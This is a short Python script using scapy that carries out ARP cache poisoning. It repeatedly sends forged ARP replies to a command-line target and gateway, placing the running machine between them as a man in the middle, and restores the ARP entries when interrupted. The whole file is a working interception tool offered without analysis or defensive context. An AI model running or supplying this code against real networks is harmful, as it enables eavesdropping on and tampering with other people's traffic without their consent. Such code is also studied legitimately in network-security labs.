import scapy.all as scapy
import time
import optparse

def GetMacAdress(ip):

    arpRequestPacket = scapy.ARP(pdst=ip)
    #scapy.ls(scapy.ARP())
    broadcastPacket = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #scapy.ls(scapy.Ether())
    combinedPacket = broadcastPacket/arpRequestPacket
    answeredList = scapy.srp(combinedPacket,timeout=1, verbose=False)[0]

    return answeredList[0][1].hwsrc

def ArpPoisoning(targetIP, poisonedIP):

    targetMac = GetMacAdress(targetIP)
    arpResponse = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMac, psrc=poisonedIP)
    scapy.send(arpResponse, verbose=False)
    #scapy.ls(scapy.ARP())

def ResetOperation(fooledIP, gatewayIP):

    fooledMac = GetMacAdress(fooledIP)
    gatewayMac = GetMacAdress(gatewayIP)
    arpResponse = scapy.ARP(op=2, pdst=fooledIP, hwdst=fooledMac, psrc=gatewayIP, hwsrc=gatewayMac)
    scapy.send(arpResponse, verbose=False, count = 6)

def GetUserInput():
    parseObject = optparse.OptionParser()
    parseObject.add_option("-t", "--target", dest = "targetIP", help="Enter Target IP")
    parseObject.add_option("-g","--gateway", dest="gatewayIP", help="Enter Gateway IP")
    options = parseObject.parse_args()[0]

    if not options.targetIP:
        print("Enter Target IP")
    if not options.gatewayIP:
        print("Enter Gateway IP")

    return options


number = 0

userIps = GetUserInput()
userTargetIp = userIps.targetIP
userGatewayIp = userIps.gatewayIP

try:
    while True:

        print("\rTotal packages sent {}".format(number),end="")

        ArpPoisoning(userTargetIp, userGatewayIp)
        ArpPoisoning(userGatewayIp, userTargetIp)

        time.sleep(3)
        number += 2


except KeyboardInterrupt:
    print("\nQuit&Reset")
    ResetOperation(userTargetIp,userGatewayIp,)
    ResetOperation(userGatewayIp,userTargetIp)

    #You can stop the loop by ctrl+c.